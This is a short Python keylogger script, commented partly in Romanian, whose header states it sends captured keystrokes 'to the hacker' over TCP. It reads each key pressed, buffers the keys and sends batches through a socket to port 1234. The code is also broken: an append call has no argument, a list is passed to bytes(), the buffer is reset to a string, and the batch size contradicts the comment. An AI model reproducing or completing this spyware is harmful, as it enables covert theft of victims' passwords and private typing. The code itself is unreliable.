#--------------------Program purpose-------------------
#we take each 25 chars and send it to the hacker using tcp 

#--------------------Libraries-----------------------
import keyboard
import socket

#--------------------Variables-----------------------
buffer = [] #list of key pressed 
programRunning = True 

#--------------------Algorithm-----------------------
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #ipv4 tcp socket 
s.connect( (socket.gethostname(), 1234) ) #ne conectam la server

while programRunning: 
    keyPressed = keyboard.read_key() #take the key pressed at the moment 
    buffer.append()         #append to list of key pressed 
    print(keyPressed) 

    if len(buffer) == 10:
        #trimitem prin tcp 
        msgToSend = bytes(buffer,"utf-8")
        s.send(msgToSend)
        buffer = ""
    